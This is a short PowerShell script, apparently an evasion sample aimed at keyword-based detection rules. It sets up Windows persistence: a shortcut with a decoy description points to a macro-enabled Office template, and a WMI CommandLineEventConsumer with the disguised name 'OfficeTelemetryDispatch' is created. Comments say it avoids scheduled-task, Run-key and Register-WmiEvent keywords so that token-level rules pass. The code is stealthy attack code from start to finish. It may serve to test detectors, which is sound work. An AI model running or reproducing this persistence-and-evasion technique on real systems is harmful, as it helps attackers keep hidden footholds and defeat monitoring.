# Subtle persistence via COM event subscription — uses no scheduled-task or
# Run-key keywords, so token-level rules pass.

$lnkSrc = Join-Path $env:APPDATA 'Microsoft\Templates\NewTemplate.docm'
$lnk = New-Object -ComObject WScript.Shell
$shortcut = $lnk.CreateShortcut((Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\v1.0\PSConfigurationProviders.lnk'))
$shortcut.TargetPath = $lnkSrc
$shortcut.Description = 'Office template index'
$shortcut.Save()

# Touch the WMI subscription space without using Register-WmiEvent (which our
# rule list looks for as a keyword). Same outcome, different surface.
$wmi = [WmiClass]'root\subscription:CommandLineEventConsumer'
$consumer = $wmi.CreateInstance()
$consumer.Name = 'OfficeTelemetryDispatch'
$consumer.CommandLineTemplate = $lnkSrc
$consumer.Put() | Out-Null
